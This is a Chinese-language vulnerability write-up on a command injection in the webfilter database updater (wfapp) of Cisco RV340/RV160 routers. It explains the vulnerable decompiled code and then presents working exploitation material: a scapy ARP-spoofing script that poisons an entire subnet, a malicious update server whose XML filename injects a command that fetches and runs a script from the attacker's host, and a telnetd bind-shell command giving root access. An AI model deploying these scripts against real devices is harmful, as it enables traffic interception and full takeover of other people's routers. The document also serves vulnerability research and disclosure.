## 漏洞原理

这个漏洞是`cisco RV340`和`cisco RV160`系列中存在的一个命令注入漏洞，命令注入发生在`wfapp`中，漏洞原理如下。

`wfapp`运行后会检查当前`/tmp/webrootdb`目录下是否存在`webfilter`数据库文件，如果存在，则不向服务器发送更新数据库的请求，如果不存在，则会拉取更新。同时`wfapp`会创建守护进程，`24`小时会自动更新一次`webfilter`数据库。`wfapp`的启动过程写入在`/etc/init.d/webfilter`这个中，是一个开机自启的服务。

拉取数据库文件更新的过程中，`wfapp`首先会向`bcap15.brightcloud.com`发起一个`post`请求，检查是否有新的webfilter数据库可从`brightcloud`中获得：

    
    
    POST / HTTP/1.1
    Content-Type: text/html
    Host: bcap15.brightcloud.com
    Content-Length: 296
    Connection: close
    <?BrightCloud version=bcap/1.1?>
    <bcap>
      <seqnum>1</seqnum>
      <encrypt-type>none</encrypt-type>
      <request>
        <method>getmd5update1mrep</method>
        <uid>PSZ25281CDE</uid>
        <productid>RV340-WB</productid>
        <oemid>Cisco</oemid>
        <md5currentmajor>0</md5currentmajor>
        <md5currentminor>0</md5currentminor>
      </request>
    </bcap>
    

然后`bcap15.brightcloud.com`会返回一个`http`响应：

    
    
    HTTP/1.1 200 OK
    Content-Type: application/xml
    Date: Fri, 01 Oct 2021 14:00:39 GMT
    Server: Kestrel
    Content-Length: 425
    Connection: Close
    <?BrightCloud version=bcap/1.1?>
    <bcap>
      <seqnum>1</seqnum>
      <status>200</status>
      <statusmsg>OK</statusmsg>
      <response>
        <status>200</status>
        <statusmsg>OK</statusmsg>
        <filename>full_bcdb_rep_1m_7.888.bin</filename>
        <checksum>2381a9b7ea1ce3bd0c71c41891507233</checksum>
        <updateMajorVersion>7</updateMajorVersion>
        <updateMinorVersion>888</updateMinorVersion>
        <targetchecksum>2381a9b7ea1ce3bd0c71c41891507233</targetchecksum>
      </response>
    </bcap>
    

当`bcap15.brightcloud.com`返回响应，表示有新的数据库更新之后，`wfapp`会向`database.brightcloud.com`这个服务发送请求，从`database.brightcloud.com`下载新的`webfilter`数据库，检查`webfilter`数据库文件的格式通过之后，会进入后续的处理流程，命令注入就发生在`wfapp`处理数据库文件名时，漏洞触发点如下：

    
    
    sprintf(s, "ls %s%s", "/mnt/webrootdb/", "full_bcdb_rep_1m*");
      fd = popen(s, "r");
      if ( fd )
      {
        if ( isstdout )
          printf(" Checking for 1M URL DB file %s%s\r\n", "/mnt/webrootdb/", "full_bcdb_rep_1m*");
        if ( issyslog )
          syslog(6, " Checking for 1M URL DB file %s%s\r\n", "/mnt/webrootdb/", "full_bcdb_rep_1m*");
        if ( fgets(filename, 64, fd) )
        {
          s[strlen(filename) - 65] = 0;
                    
            ...
       strcpy((char *)cmdinject, filename);
    
    
    
    sprintf(
              s,
              "rm %s%s; cp %s %s; rm /tmp/%s",
              "/mnt/webrootdb/",
              "full_bcdb_rep_1m*",
              (const char *)cmdinject,
              "/mnt/webrootdb/",
              "full_bcdb_rep_1m*");                 // 命令注入
            if ( isstdout )
              printf(" saving the 1M URLDB file to webroot parition using the command:'%s'\r\n", s);
            if ( issyslog )
              syslog(6, " saving the 1M URLDB file to webroot parition using the command:'%s'\r\n", s);
            if ( popen(s, "r") )
            {
              if ( isstdout )
                printf(" Successfully saved the file to webroot partition '%s'\r\n", "/mnt/webrootdb/");
              if ( issyslog )
                syslog(6, " Successfully saved the file to webroot partition '%s'\r\n", "/mnt/webrootdb/");
            }
    

要利用这个漏洞，需要做一次中间人攻击，让攻击者的主机向路由器返回一个响应体，这个响应体的`xml`文件的`filename`标签中可以嵌入恶意的`shell`命令，然后把反弹`shell`脚本部署在中间人的主机上。

这个漏洞具有一定局限性，只能`24`小时攻击一次，或者等待设备重启之后再攻击。

## 漏洞利用

这里做中间人攻击，有两种利用方式，这两种利用方式都有一定的局限性。

第一种是arp欺骗，把毒化整个局域网下所有主机的arp缓存，让路由器的ip地址对应攻击者主机的mac地址，这种情况下，路由器会认为攻击者的主机是整个局域网的网关，`bcap15.brightcloud.com`服务器返回的响应会首先通过攻击者的主机，设置ip_forword流量转发和iptables规则，完成改包。

第二种是想办法做DNS劫持，把bcap.brightcloud.com
，databse.brightcloud.com这两域名和恶意的服务ip绑定，这样所有发送给这两个服务器的请求都可以被攻击者截获。

第一种利用方式，由于劫持了局域网下的所有入口流量，很容易导致整个局域网炸网，出现路由器重启之后无法连接外网的情况，路由器无法连接外网，就无法向`bcap.brightcloud.com
`服务器发送请求，给分析和复现带来困难，这里给出arp欺骗攻击的脚本，有兴趣可以尝试一下。

    
    
    import os
    from tabnanny import verbose
    
    from numpy import broadcast
    from scapy.all import *
    import requests
    
    gateway_ip = "192.168.1.1"          # cisco ip address
    fake_gateway_ip = "192.168.1.127"   # ubuntu ip address
    
    def arpspoof(gateway_ip,fake_gateway_mac):
        packet = ARP(op=2,pdst="0.0.0.0",psrc=gateway_ip,hwsrc=fake_gateway_mac)        # arp广播
        send(packet,verbose=False)
    
    def exp():
        #fake_gateway_mac = get_mac(fake_gateway_ip)
        try:
            sent_packets_count = 0
            while True:
                arpspoof(gateway_ip,"00:0c:29:9f:9f:4a")
                #arpspoof(attack_ip,gateway_ip)
                sent_packets_count += 1
                print("[*] Packets Sent "+str(sent_packets_count))
                os.system("arp -a|grep 192.168.1.1")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            print("[+] Arp Spoof Stopped")
    
    exp()
    

arp包设置成广播包，pdst和hwdst都置空，这样可以完成对整个子网的欺骗，完成对`bcap15.brightcloud.com`响应的拦截。

第二种改`DNS`的方法，只能在登录`RV340`的后台之后才能使用，`RV340`的`web`管理界面提供了一个`DNS local
database`的功能，可以设置域名解析，

![image](https://image.3001.net/images/20220829/1661741158_630c286676ba99652cd87.png!small)  
由于`RV340`更新`webfilter database`需要重启，而我们后台所做的配置是`running
config`，重启之后配置的域名解析会失效，所以还需要把配置的信息设置成`startup config`。

![image](https://image.3001.net/images/20220829/1661741170_630c287230e509e997bd1.png!small)

需要两台攻击机，一台服务器上会响应恶意的`xml`文件，部署恶意的shell脚本，一台服务器上放格式正确的`Webfilter`数据库文件，在文件名和xml文件filename标签里插入恶意的shell语句。

    
    
    from wsgiref.util import request_uri
    from simple_http_server import *
    import simple_http_server.server as server
    import requests
    
    filename = "full_bcdb_rep_1m_8.334.bin"
    payload = "full_bcdb_rep_1m_8.334`curl${IFS}192.168.1.127|sh`.bin"
    # download reverse_shell.sh
    
    @request_map('/',method=["POST"])
    def index_ctroller_function():
        xmldata = '''
        <?xml version="1.0" encoding="UTF-8" ?>
        <?BrightCloud version=bcap/1.1?>
        <bcap>
            <seqnum>1</seqnum>
            <status>200</status>
            <statusmsg>OK</statusmsg>
            <response>
            <status>200</status>
            <statusmsg>OK</statusmsg>
            <filename>%s</filename>
            <checksum>896bb64c7dd8661535b5cbe55fe7c17e</checksum>
            <updateMajorVersion>8</updateMajorVersion>
            <updateMinorVersion>334</updateMinorVersion>
            <targetchecksum>896bb64c7dd8661535b5cbe55fe7c17e</targetchecksum>
            </response>
        </bcap>
        '''%payload
        return xmldata
    
    @request_map("/",method=['GET'])
    def reverseshell_ctroller_function():
        return StaticFile("./opentelnet")
    
    def main(*args):
        server.start(port=80)
    
    if __name__ == "__main__":
        main()
    

`open telnet`的脚本如下：

    
    
    /usr/sbin/telnetd -l /bin/sh -p23333
    

开启web服务：

![image](https://image.3001.net/images/20220829/1661741185_630c28816a8f03249c57b.png!small)

另一台服务器上，把命令写入到数据库文件的文件名中，然后开启`web`服务：

![image](https://image.3001.net/images/20220829/1661741198_630c288ed1985016acc49.png!small)

![image](https://image.3001.net/images/20220829/1661741209_630c2899ca9c162b8c3d4.png!small)

`telnet`远程登录获取`rootshell`：

![image](https://image.3001.net/images/20220829/1661741224_630c28a8b933a08cede55.png!small)

## 漏洞修复

修复的方法，是本地保留`cacert`证书，不向不受信任的服务器发送请求。

![image](https://image.3001.net/images/20220829/1661741236_630c28b46d1351f2cba2c.jpg!small)

## 后续思考

这个漏洞，看起来有些鸡肋，利用起来处处掣肘，但是也有延长利用链的可能。

![image](https://image.3001.net/images/20220829/1661743201_630c306104ac0c7e1ba2e.png!small)

## 参考

<https://onekey.com/blog/advisory-cisco-small-business-rv-series-routers-web-filter-database-update-command-injection-vulnerability/>

